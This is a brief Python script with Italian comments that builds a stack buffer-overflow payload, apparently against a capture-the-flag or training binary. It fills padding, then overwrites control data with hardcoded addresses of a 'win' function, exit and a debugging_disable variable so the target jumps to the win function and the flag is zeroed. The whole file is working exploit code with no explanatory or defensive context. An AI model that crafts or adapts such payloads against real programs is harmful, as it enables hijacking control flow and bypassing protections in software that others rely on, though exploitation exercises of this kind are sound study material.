import struct 

#sostituire &c con l'indirizzo di debugging_disable
#passare ad argv[1] il valore 0 per impostare debugging_disable = 0
# *fp = &c --> *fp = &debugging_disable --> *fp = 0 
debug_disable = 0x804a034
win = 0x804852b
exit = 0xb7e337f0

atk_vector = 'A'*238
atk_vector += struct.pack('I', win)
atk_vector += struct.pack('I', exit)
atk_vector += 'A'*(260-len(atk_vector))
atk_vector += 'A'*8
atk_vector += struct.pack('I', debug_disable)

print(atk_vector)
